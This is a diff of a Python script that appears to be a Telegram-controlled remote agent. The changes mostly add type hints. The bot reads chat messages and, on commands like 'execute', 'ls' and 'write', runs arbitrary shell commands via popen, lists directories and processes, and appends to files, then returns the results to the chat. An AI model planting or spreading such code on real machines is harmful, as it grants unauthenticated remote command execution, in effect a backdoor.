@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+from typing import Any, Generator
 from os import listdir, popen
 from requests import get
 from json import loads
@@ -10,7 +11,7 @@ MAX_MESSAGE_LENGTH = 4000
 
 
 # Parse JSON from URL request answer
-def get_json(url):
+def get_json(url: str):
     res = get(url)
     return loads(res.content) if res.status_code == 200 else None
 
@@ -19,7 +20,7 @@ def get_json(url):
 # ! -----------------
 
 
-def ls(path):
+def ls(path: str) -> str:
     try:
         return '\n'.join(listdir(path))
     except FileNotFoundError:
@@ -27,15 +28,15 @@ def ls(path):
         return "Err: No such dir"
 
 
-def active_users():
+def active_users() -> str:
     return '\n'.join([line.split('    ')[0] for line in popen('w').readlines()[-1:1:-1]])
 
 
-def ps():
+def ps() -> str:
     return ''.join([line.split(' ')[-1] for line in popen('ps').readlines()[-1:0:-1]])
 
 
-def write_to_file(filename, data):
+def write_to_file(filename: str, data: str) -> Any:
     try:
         with open(filename, 'a') as file:
             file.write(data)
@@ -46,11 +47,11 @@ def write_to_file(filename, data):
         return Error
 
 
-def exec_command(command):
-    return '\n'.join(popen(' '.join(command)).readlines())
+def exec_command(command: str) -> str:
+    return '\n'.join(popen(command).readlines())
 
 
-def parse_payload(command):
+def parse_payload(command: str) :
     splitted = command.split(" ")
     if splitted[0] == "ls" and len(splitted) >= 2:
         files = ls(splitted[1])
@@ -62,7 +63,7 @@ def parse_payload(command):
     elif splitted[0] == "write" and len(splitted) >= 3:
         return utils.WRT_HTML + write_to_file(splitted[1], splitted[2])
     elif splitted[0] == 'execute':
-        return exec_command(splitted[1:])
+        return exec_command(' '.join(splitted[1:]))
     elif splitted[0] == "terminate":
         return "terminate"
     else:
@@ -71,7 +72,7 @@ def parse_payload(command):
 
 # ! Telegram API communication
 # ! --------------------------
-def get_status():
+def get_status() -> None:
     answer = get(utils.URL + "/getme")
     if answer.status_code == 200:
         print("Connection works")
@@ -79,11 +80,11 @@ def get_status():
         print("Connection does not work")
 
 
-def mark_read(offset):
+def mark_read(offset: int) -> None:
     get_json(utils.URL + "/getUpdates?offset={}".format(offset))
 
 
-def get_updates():
+def get_updates() -> Generator:
     answer = get_json(utils.URL + "/getUpdates")
     if (answer is None) or (not answer["ok"]):
         print("Wrong request for Updates")
@@ -93,7 +94,7 @@ def get_updates():
         yield result
 
 
-def send_answer(msg, chat_id):
+def send_answer(msg: str, chat_id: int) -> None:
     start = 0
     end = min(len(msg), MAX_MESSAGE_LENGTH)
 
